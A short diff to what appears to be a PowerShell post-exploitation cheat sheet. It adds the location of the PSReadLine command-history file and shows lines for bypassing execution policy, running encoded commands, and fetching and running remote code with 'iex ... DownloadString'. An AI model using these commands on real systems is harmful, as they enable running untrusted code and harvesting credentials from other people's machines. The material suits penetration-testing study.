@@ -114,6 +114,11 @@ powershell -c <cmd>
 powershell -encodedcommand
 $env:PSExecutionPolicy
 Set-ExecutionPolicy -Scope CurrentUser bypass
+
+--------------------------------------------Powershell history------------------------------
+Get-PSReadLineOption
+C:\Users\<User>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
 -------------------------------------------running scripts-----------------------------
 iex(New-Object Net.WebClient).DownloadString('<URL>')
 
